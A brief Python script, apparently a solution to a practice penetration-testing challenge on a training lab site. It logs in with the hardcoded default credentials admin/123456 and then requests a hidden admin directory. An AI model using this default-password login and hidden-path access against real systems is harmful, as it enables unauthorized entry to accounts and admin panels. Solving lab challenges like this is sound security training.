#!/usr/bin/env python3.4

import requests

s = requests.session()

values = {'username':'admin','password':'123456'}

r = s.post('http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/index.php',data=values)
r = s.post('http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/myadminroot/')
print(r.content)
